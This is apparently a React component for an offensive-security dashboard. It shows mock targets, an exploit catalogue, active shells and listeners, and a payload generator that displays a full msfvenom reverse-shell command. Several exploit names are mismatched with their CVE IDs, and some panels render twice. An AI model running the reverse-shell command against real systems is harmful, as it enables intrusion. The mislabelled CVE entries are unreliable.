import { Send, X, Check, AlertCircle, Loader2, Copy, Play, Square } from "lucide-react";
import { Input } from "@/components/ui/input";
import { Badge } from "@/components/ui/badge";
import { useState, lazy, Suspense } from "react";

// Lazy load panel components to prevent circular dependencies
const NetworkGraph = lazy(() => import("./NetworkGraph"));
const ExploitFlow = lazy(() => import("./ExploitFlow"));
const LogStream = lazy(() => import("./LogStream"));
const CredentialManager = lazy(() => import("./CredentialManager"));
const ReportGenerator = lazy(() => import("./ReportGenerator"));
const CampaignScheduler = lazy(() => import("./CampaignScheduler"));
const CollaborationPanel = lazy(() => import("./CollaborationPanel"));
const AttackTimeline = lazy(() => import("./AttackTimeline"));
const RemediationAdvisor = lazy(() => import("./RemediationAdvisor"));
const ThreatIntelligence = lazy(() => import("./ThreatIntelligence"));
const ReportScheduler = lazy(() => import("./ReportScheduler"));
const ComplianceChecker = lazy(() => import("./ComplianceChecker"));
const AISecurityAdvisor = lazy(() => import("./AISecurityAdvisor"));
const VulnerabilityPrioritizer = lazy(() => import("./VulnerabilityPrioritizer"));
const BeaconManager = lazy(() => import("./BeaconManager"));
const ListenerPanel = lazy(() => import("./ListenerPanel"));
const PayloadBuilder = lazy(() => import("./PayloadBuilder"));
const ProcessInjectionPanel = lazy(() => import("./ProcessInjectionPanel"));
const CovertChannelsPanel = lazy(() => import("./CovertChannelsPanel"));
const LateralMovementPanel = lazy(() => import("./LateralMovementPanel"));
const PostExploitationPanel = lazy(() => import("./PostExploitationPanel"));
const RowhammerPanel = lazy(() => import("./RowhammerPanel"));
const MapboxVisualization = lazy(() => import("./MapboxVisualization"));
const PhysicalSecurityPanel = lazy(() => import("./PhysicalSecurityPanel"));
const MitreAttackPanel = lazy(() => import("./MitreAttackPanel"));
const C2FrameworkPanel = lazy(() => import("./C2FrameworkPanel"));

interface RightPanelProps {
  activePanel: string;
  onClose: () => void;
}

const RightPanel = ({ activePanel, onClose }: RightPanelProps) => {
  const [selectedExploit, setSelectedExploit] = useState<string | null>(null);

  if (!activePanel) return null;

  const getPanelTitle = () => {
    const titles: Record<string, string> = {
      targets: "Target Enumeration",
      exploits: "Exploit Database",
      payloads: "Payload Generator",
      vulns: "Vulnerability Scanner",
      network: "Network Mapper",
      shells: "Active Shells",
      listeners: "Listeners",
      loot: "Credential Vault",
      monitor: "Live Monitoring",
      pivots: "Campaign Scheduler",
      collab: "Team Collaboration",
      timeline: "Attack Timeline",
      remediation: "Remediation Advisor",
      "threat-intel": "Threat Intelligence",
      "report-scheduler": "Report Scheduler",
      compliance: "Compliance Checker",
      "ai-advisor": "AI Security Advisor",
      "vuln-prioritizer": "Vulnerability Prioritizer",
      beacons: "Beacon Manager",
      injection: "Process Injection",
      covert: "Covert Channels",
      lateral: "Lateral Movement",
      postexploit: "Post-Exploitation",
      "physical-security": "Physical Security",
      "mitre-attack": "MITRE ATT&CK",
      "c2-framework": "C2 Framework",
      rowhammer: "Rowhammer Testing",
      geomap: "Geographic Map"
    };
    return titles[activePanel] || "Panel";
  };

  return (
    <div className="w-96 bg-sidebar-bg border-l border-border flex flex-col">
      <div className="h-9 px-3 flex items-center justify-between border-b border-border">
        <span className="text-xs uppercase tracking-wide font-semibold text-text-secondary">
          {getPanelTitle()}
        </span>
        <button
          onClick={onClose}
          className="w-6 h-6 flex items-center justify-center hover:bg-sidebar-hover rounded transition-colors"
        >
          <X className="w-3.5 h-3.5" />
        </button>
      </div>
      
      <div className="flex-1 overflow-y-auto scrollbar-thin">
        <Suspense fallback={<div className="p-4 text-xs text-text-secondary">Loading...</div>}>
        {activePanel === "targets" && (
          <div className="p-3 space-y-2">
            <div className="text-xs text-text-muted mb-2">ACTIVE TARGETS (12)</div>
            {[
              { ip: "192.168.1.10", hostname: "web-server-01.corp.local", os: "Ubuntu 20.04 LTS", status: "enumeration", ports: "22,80,443,3306", risk: "high" },
              { ip: "192.168.1.25", hostname: "dc01.corp.local", os: "Windows Server 2019", status: "exploiting", ports: "53,88,135,389,445", risk: "critical" },
              { ip: "192.168.1.50", hostname: "mail.corp.local", os: "CentOS 8", status: "compromised", ports: "25,110,143,465,993", risk: "medium" },
              { ip: "10.10.10.100", hostname: "vpn-gateway", os: "pfSense 2.5", status: "scanning", ports: "500,4500", risk: "high" },
              { ip: "172.16.0.5", hostname: "jenkins.dev.local", os: "Debian 11", status: "vulnerable", ports: "8080,50000", risk: "critical" }
            ].map((target, i) => (
              <div key={i} className="bg-panel-bg rounded p-2.5 border border-border hover:border-primary transition-colors cursor-pointer group">
                <div className="flex items-start justify-between mb-1">
                  <div className="flex-1 min-w-0">
                    <div className="flex items-center gap-2">
                      <span className="text-text-primary text-xs font-mono font-semibold">{target.ip}</span>
                      <Badge variant={target.risk === "critical" ? "destructive" : target.risk === "high" ? "default" : "secondary"} className="h-4 text-xs">
                        {target.risk}
                      </Badge>
                    </div>
                    <div className="text-text-secondary text-xs mt-0.5 truncate">{target.hostname}</div>
                  </div>
                  <div className={`w-2 h-2 rounded-full flex-shrink-0 ${
                    target.status === "compromised" ? "bg-red-500 animate-pulse" :
                    target.status === "exploiting" ? "bg-yellow-500 animate-pulse" :
                    target.status === "vulnerable" ? "bg-orange-500" :
                    target.status === "enumeration" ? "bg-blue-500 animate-pulse" :
                    "bg-green-500 animate-pulse"
                  }`} />
                </div>
                <div className="flex items-center gap-2 text-xs text-text-muted">
                  <span className="truncate">{target.os}</span>
                </div>
                <div className="flex items-center justify-between mt-1.5">
                  <span className="text-xs text-text-muted">Ports: {target.ports}</span>
                  <span className="text-xs text-primary opacity-0 group-hover:opacity-100 transition-opacity">{target.status}</span>
                </div>
              </div>
            ))}
          </div>
        )}
        
        {activePanel === "exploits" && (
          selectedExploit ? (
            <ExploitFlow />
          ) : (
            <div className="p-3 space-y-2">
              <Input placeholder="Search exploits (CVE, name, platform)..." className="h-7 text-xs mb-2" />
              <div className="text-xs text-text-muted mb-2">AVAILABLE EXPLOITS (2,847)</div>
              {[
                { id: "EXP-2024-001", name: "Apache Struts2 RCE", cve: "CVE-2023-50164", platform: "Linux/Windows", reliability: 95, severity: "critical" },
                { id: "EXP-2023-287", name: "Windows SMB Privilege Escalation", cve: "CVE-2023-23397", platform: "Windows", reliability: 89, severity: "high" },
                { id: "EXP-2024-012", name: "Jenkins Script Console RCE", cve: "CVE-2024-23897", platform: "Java/Linux", reliability: 98, severity: "critical" },
                { id: "EXP-2023-445", name: "ProFTPD Arbitrary Code Execution", cve: "CVE-2023-51713", platform: "Unix/Linux", reliability: 76, severity: "high" },
                { id: "EXP-2024-089", name: "WordPress Plugin SQLi", cve: "CVE-2024-1234", platform: "PHP/MySQL", reliability: 92, severity: "medium" }
              ].map((exp, i) => (
                <div 
                  key={i} 
                  onClick={() => setSelectedExploit(exp.id)}
                  className={`bg-panel-bg rounded p-2.5 border transition-all cursor-pointer ${
                    selectedExploit === exp.id ? "border-primary" : "border-border hover:border-primary/50"
                  }`}
                >
                  <div className="flex items-start justify-between mb-1">
                    <div className="flex-1 min-w-0">
                      <div className="text-text-primary text-xs font-semibold truncate">{exp.name}</div>
                      <div className="text-text-muted text-xs mt-0.5">{exp.cve}</div>
                    </div>
                    <Badge variant={exp.severity === "critical" ? "destructive" : "default"} className="h-4 text-xs ml-2">
                      {exp.severity}
                    </Badge>
                  </div>
                  <div className="flex items-center justify-between mt-1.5">
                    <span className="text-xs text-text-secondary">{exp.platform}</span>
                    <div className="flex items-center gap-1">
                      <div className="h-1.5 w-16 bg-editor-active-line rounded-full overflow-hidden">
                        <div 
                          className={`h-full ${exp.reliability > 90 ? "bg-green-500" : exp.reliability > 75 ? "bg-yellow-500" : "bg-orange-500"}`}
                          style={{ width: `${exp.reliability}%` }}
                        />
                      </div>
                      <span className="text-xs text-text-muted">{exp.reliability}%</span>
                    </div>
                  </div>
                  <div className="mt-2 pt-2 border-t border-border">
                    <button className="w-full h-6 bg-primary hover:bg-primary-hover text-primary-foreground rounded text-xs font-medium flex items-center justify-center gap-1">
                      <Play className="w-3 h-3" />
                      Execute Exploit
                    </button>
                  </div>
                </div>
              ))}
            </div>
          )
        )}
        
        {activePanel === "payloads" && (
          <div className="p-3 space-y-3">
            <div className="space-y-2">
              <label className="text-xs text-text-secondary uppercase">Payload Type</label>
              <select className="w-full h-7 bg-input-bg border border-input-border rounded px-2 text-xs text-text-primary">
                <option>Reverse TCP Shell</option>
                <option>Bind Shell</option>
                <option>Meterpreter</option>
                <option>Web Shell</option>
                <option>PowerShell Empire</option>
              </select>
            </div>
            <div className="space-y-2">
              <label className="text-xs text-text-secondary uppercase">Target Platform</label>
              <select className="w-full h-7 bg-input-bg border border-input-border rounded px-2 text-xs text-text-primary">
                <option>Linux x64</option>
                <option>Windows x64</option>
                <option>macOS x64</option>
                <option>PHP</option>
                <option>Python</option>
              </select>
            </div>
            <div className="space-y-2">
              <label className="text-xs text-text-secondary uppercase">LHOST</label>
              <Input value="10.10.14.5" className="h-7 text-xs font-mono" />
            </div>
            <div className="space-y-2">
              <label className="text-xs text-text-secondary uppercase">LPORT</label>
              <Input value="4444" className="h-7 text-xs font-mono" />
            </div>
            <div className="space-y-2">
              <label className="text-xs text-text-secondary uppercase flex items-center gap-2">
                <input type="checkbox" className="w-3 h-3" />
                Encode Payload
              </label>
              <label className="text-xs text-text-secondary uppercase flex items-center gap-2">
                <input type="checkbox" className="w-3 h-3" />
                Obfuscate
              </label>
            </div>
            <button className="w-full h-8 bg-primary hover:bg-primary-hover text-primary-foreground rounded text-xs font-medium">
              Generate Payload
            </button>
            <div className="bg-editor-bg rounded p-2 border border-border">
              <div className="flex items-center justify-between mb-1">
                <span className="text-xs text-text-muted">Generated Payload</span>
                <button className="text-primary hover:text-primary-hover">
                  <Copy className="w-3 h-3" />
                </button>
              </div>
              <div className="text-xs font-mono text-syntax-string break-all">
                msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf {'>'} shell.elf
              </div>
            </div>
          </div>
        )}
        
        {activePanel === "vulns" && (
          <div className="p-3 space-y-2">
            <div className="flex items-center gap-2 mb-2">
              <button className="flex-1 h-7 bg-primary hover:bg-primary-hover text-primary-foreground rounded text-xs font-medium flex items-center justify-center gap-1">
                <Play className="w-3 h-3" />
                Start Scan
              </button>
              <button className="w-7 h-7 bg-destructive hover:bg-destructive/90 text-destructive-foreground rounded flex items-center justify-center">
                <Square className="w-3 h-3" />
              </button>
            </div>
            <div className="text-xs text-text-muted mb-2">SCAN RESULTS (47 VULNERABILITIES)</div>
            {[
              { title: "SQL Injection in login form", severity: "critical", cvss: 9.8, host: "192.168.1.10:80", status: "confirmed" },
              { title: "Outdated OpenSSH version", severity: "high", cvss: 7.5, host: "192.168.1.10:22", status: "confirmed" },
              { title: "Apache server misconfiguration", severity: "medium", cvss: 5.3, host: "192.168.1.10:443", status: "potential" },
              { title: "Weak SSL/TLS cipher suites", severity: "medium", cvss: 4.8, host: "192.168.1.25:443", status: "confirmed" },
              { title: "SMB signing not required", severity: "high", cvss: 8.1, host: "192.168.1.25:445", status: "confirmed" }
            ].map((vuln, i) => (
              <div key={i} className="bg-panel-bg rounded p-2.5 border border-border">
                <div className="flex items-start justify-between mb-1">
                  <div className="flex-1 min-w-0">
                    <div className="text-text-primary text-xs font-semibold">{vuln.title}</div>
                    <div className="text-text-muted text-xs mt-0.5">{vuln.host}</div>
                  </div>
                  <Badge variant={vuln.severity === "critical" ? "destructive" : vuln.severity === "high" ? "default" : "secondary"} className="h-4 text-xs ml-2">
                    {vuln.cvss}
                  </Badge>
                </div>
                <div className="flex items-center justify-between mt-1.5">
                  <span className="text-xs text-text-secondary uppercase">{vuln.severity}</span>
                  <span className={`text-xs ${vuln.status === "confirmed" ? "text-red-500" : "text-yellow-500"}`}>
                    {vuln.status === "confirmed" ? <Check className="w-3 h-3" /> : <AlertCircle className="w-3 h-3" />}
                  </span>
                </div>
              </div>
            ))}
          </div>
        )}
        
        {activePanel === "network" && (
          <NetworkGraph />
        )}
        
        {activePanel === "shells" && (
          <div className="p-3 space-y-2">
            <div className="text-xs text-text-muted mb-2">ACTIVE SESSIONS (5)</div>
            {[
              { id: "SESSION_001", target: "192.168.1.10", user: "www-data", type: "reverse_tcp", uptime: "02:47:33", status: "stable" },
              { id: "SESSION_002", target: "192.168.1.25", user: "root", type: "meterpreter", uptime: "01:15:22", status: "stable" },
              { id: "SESSION_003", target: "10.10.1.5", user: "SYSTEM", type: "smb", uptime: "00:43:11", status: "unstable" },
              { id: "SESSION_004", target: "172.16.0.5", user: "jenkins", type: "webshell", uptime: "03:22:45", status: "stable" },
              { id: "SESSION_005", target: "10.10.2.34", user: "user", type: "ssh", uptime: "00:08:57", status: "interactive" }
            ].map((shell, i) => (
              <div key={i} className="bg-panel-bg rounded p-2.5 border border-border hover:border-primary transition-colors cursor-pointer group">
                <div className="flex items-start justify-between mb-1.5">
                  <div className="flex-1 min-w-0">
                    <div className="flex items-center gap-2">
                      <span className="text-text-primary text-xs font-mono font-semibold">{shell.id}</span>
                      <div className={`w-1.5 h-1.5 rounded-full ${
                        shell.status === "stable" ? "bg-green-500" :
                        shell.status === "unstable" ? "bg-yellow-500 animate-pulse" :
                        "bg-blue-500 animate-pulse"
                      }`} />
                    </div>
                    <div className="text-text-secondary text-xs mt-0.5">{shell.target} ({shell.user})</div>
                  </div>
                  <Badge variant="outline" className="h-4 text-xs">{shell.type}</Badge>
                </div>
                <div className="flex items-center justify-between text-xs">
                  <span className="text-text-muted">Uptime: {shell.uptime}</span>
                  <button className="text-primary opacity-0 group-hover:opacity-100 transition-opacity text-xs font-medium">
                    Interact →
                  </button>
                </div>
              </div>
            ))}
          </div>
        )}
        
        {activePanel === "listeners" && (
          <div className="p-3 space-y-2">
            <button className="w-full h-7 bg-primary hover:bg-primary-hover text-primary-foreground rounded text-xs font-medium">
              + New Listener
            </button>
            <div className="text-xs text-text-muted mb-2">ACTIVE LISTENERS (8)</div>
            {[
              { port: 4444, type: "TCP", protocol: "reverse_shell", connections: 3, status: "listening" },
              { port: 443, type: "HTTPS", protocol: "meterpreter", connections: 2, status: "listening" },
              { port: 8080, type: "HTTP", protocol: "webshell", connections: 1, status: "listening" },
              { port: 53, type: "DNS", protocol: "c2_tunnel", connections: 0, status: "listening" },
              { port: 1337, type: "TCP", protocol: "bind_shell", connections: 1, status: "listening" }
            ].map((listener, i) => (
              <div key={i} className="bg-panel-bg rounded p-2.5 border border-border">
                <div className="flex items-start justify-between mb-1">
                  <div className="flex-1">
                    <div className="flex items-center gap-2">
                      <span className="text-text-primary text-xs font-mono font-semibold">:{listener.port}</span>
                      <Badge variant="outline" className="h-4 text-xs">{listener.type}</Badge>
                      <div className="w-1.5 h-1.5 rounded-full bg-green-500 animate-pulse" />
                    </div>
                    <div className="text-text-secondary text-xs mt-0.5">{listener.protocol}</div>
                  </div>
                </div>
                <div className="flex items-center justify-between mt-1.5 text-xs">
                  <span className="text-text-muted">{listener.connections} active connection{listener.connections !== 1 ? 's' : ''}</span>
                  <span className="text-green-500">{listener.status}</span>
                </div>
              </div>
            ))}
          </div>
        )}
        
        {activePanel === "loot" && <CredentialManager />}
        
        {activePanel === "monitor" && <LogStream />}
        
        {activePanel === "pivots" && <CampaignScheduler />}
        {activePanel === "collab" && <CollaborationPanel />}
        {activePanel === "timeline" && <AttackTimeline />}
        {activePanel === "remediation" && <RemediationAdvisor />}
        {activePanel === "threat-intel" && <ThreatIntelligence />}
        {activePanel === "report-scheduler" && <ReportScheduler />}
        {activePanel === "compliance" && <ComplianceChecker />}
        {activePanel === "ai-advisor" && <AISecurityAdvisor />}
        {activePanel === "vuln-prioritizer" && <VulnerabilityPrioritizer />}
        {activePanel === "beacons" && <BeaconManager />}
        {activePanel === "listeners" && <ListenerPanel />}
        {activePanel === "payloads" && <PayloadBuilder />}
        {activePanel === "injection" && <ProcessInjectionPanel />}
        {activePanel === "covert" && <CovertChannelsPanel />}
        {activePanel === "lateral" && <LateralMovementPanel />}
        {activePanel === "postexploit" && <PostExploitationPanel />}
        {activePanel === "rowhammer" && <RowhammerPanel />}
        {activePanel === "geomap" && <MapboxVisualization />}
        </Suspense>
      </div>
    </div>
  );
};

export default RightPanel;
